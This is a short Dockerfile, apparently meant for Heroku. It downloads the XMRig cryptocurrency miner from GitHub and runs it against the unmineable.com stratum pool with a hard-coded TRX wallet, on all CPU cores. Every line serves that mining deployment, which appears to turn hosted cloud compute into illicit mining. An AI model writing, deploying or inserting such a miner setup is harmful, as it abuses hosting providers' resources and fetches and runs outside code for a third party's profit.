FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar -xvf xmrig-6.16.4-linux-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o stratum+tcp://rx.unmineable.com:13333 -u TRX:TCR9rNWL15ww3TNDvKsG9sWBd4xsc6Ls6T.cpu -p x --cpu $(nproc --all)
